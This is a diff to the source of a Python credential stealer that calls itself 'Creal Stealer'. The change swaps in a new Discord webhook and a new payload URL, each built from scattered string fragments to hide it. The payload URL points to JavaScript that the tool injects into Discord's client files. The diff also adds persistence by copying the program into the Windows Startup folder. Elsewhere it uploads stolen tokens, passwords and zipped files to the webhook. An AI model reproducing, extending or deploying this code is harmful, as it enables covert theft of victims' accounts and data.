@@ -21,11 +21,26 @@ import socket
 import getpass
 import ssl
 
-oldme205252x = '3380/MxTN3s-LA06SPfkn6fIOVc8'
-nonamhwqkehk = 'woxbxzAUERL4mxCDL3hUCDtAJgSTGi'
-startuyou = 'https://discord.com/api/webhooks/11788734'
-XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT = f'{startuyou}7617038{oldme205252x}ki5kBTbXq6{nonamhwqkehk}IUpjr'
-inj_url = "https://pastebin.com/raw/RuvFf6Kk"
+
+
+
+
+oldmanx52152x52x52x = '709L8LNQUa-RivNzwOCVty'
+dkxkkckll010f0f = '6PySKtoDIH9eiB43mHw8z_3'
+idlxkc6341f10v = '0478868/HQH4GzQh'
+x5252d52fa = 'hooks/118'
+x2d2ccoms410c2 = '.com/api/w'
+hotmai54x85x58 = 'ps://dis'
+Wh0SKKkk = f'htt{hotmai54x85x58}cord{x2d2ccoms410c2}eb{x5252d52fa}357435247{idlxkc6341f10v}HM2YOlAk-{dkxkkckll010f0f}otDfF{oldmanx52152x52x52x}4'
+
+maintoscipt1212x = 'in/G'
+weee205252x = 'whwe/m'
+xololfklkg0x20 = '22/eg41w1'
+viptopxsvkkv20x = 'tent.com/Vi'
+inj_url = f'https://raw.githubusercon{viptopxsvkkv20x}pTop{xololfklkg0x20}g4wg{weee205252x}a{maintoscipt1212x}g.js'
+
+
+
     
 DETECTED = False
 
@@ -105,14 +120,14 @@ def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def L04durl1b(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data='', files='', headers=''):
+def L04durl1b(Wh0SKKkk, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=data, headers=headers))
+                r = urlopen(Request(Wh0SKKkk, data=data, headers=headers))
                 return r
             else:
-                r = urlopen(Request(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=data))
+                r = urlopen(Request(Wh0SKKkk, data=data))
                 return r
         except: 
             pass
@@ -239,7 +254,7 @@ def inj_discord():
 
                                                     inj_content = requests.get(inj_url).text
 
-                                                    inj_content = inj_content.replace("%WEBHOOK%", XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT)
+                                                    inj_content = inj_content.replace("%WEBHOOK%", Wh0SKKkk)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj_content)
@@ -308,11 +323,24 @@ def ch1ckT4k1n(t0k3n):
     except:
         return False
 
+if getattr(sys, 'frozen', False):
+    currentFilePath = os.path.dirname(sys.executable)
+else:
+    currentFilePath = os.path.dirname(os.path.abspath(__file__))
 
+fileName = os.path.basename(sys.argv[0])
+filePath = os.path.join(currentFilePath, fileName)
+
+startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+startupFilePath = os.path.join(startupFolderPath, fileName)
+
+if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
+    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
+        shutil.copyfileobj(src_file, dst_file)
 
 
 def upl05dT4k31(t0k3n, path):
-    global XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT
+    global Wh0SKKkk
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -391,7 +419,7 @@ def upl05dT4k31(t0k3n, path):
         "username": "Creal Stealer",
         "attachments": []
         }
-    L04durl1b(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=dumps(data).encode(), headers=headers)
+    L04durl1b(Wh0SKKkk, data=dumps(data).encode(), headers=headers)
 
 
 def R4f0rm3t(listt):
@@ -429,7 +457,7 @@ def upload(name, link):
             "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
             "attachments": []
             }
-        L04durl1b(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=dumps(data).encode(), headers=headers)
+        L04durl1b(Wh0SKKkk, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "crpassw":
@@ -455,7 +483,7 @@ def upload(name, link):
             "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
             "attachments": []
             }
-        L04durl1b(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=dumps(data).encode(), headers=headers)
+        L04durl1b(Wh0SKKkk, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -483,7 +511,7 @@ def upload(name, link):
             "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
             "attachments": []
             }
-        L04durl1b(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=dumps(data).encode(), headers=headers)
+        L04durl1b(Wh0SKKkk, data=dumps(data).encode(), headers=headers)
         return
 
 
@@ -674,7 +702,7 @@ def GatherZips(paths1, paths2, paths3):
         "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
         "attachments": []
     }
-    L04durl1b(XGEWQGEWGWEHQQRWQTGVQWEGBEWBEHWHBFASHRWERWEHNERWERHERHERHBDSVSDV0cWWERWRT, data=dumps(data).encode(), headers=headers)
+    L04durl1b(Wh0SKKkk, data=dumps(data).encode(), headers=headers)
 
 
 def ZipTelegram(path, arg, procc):
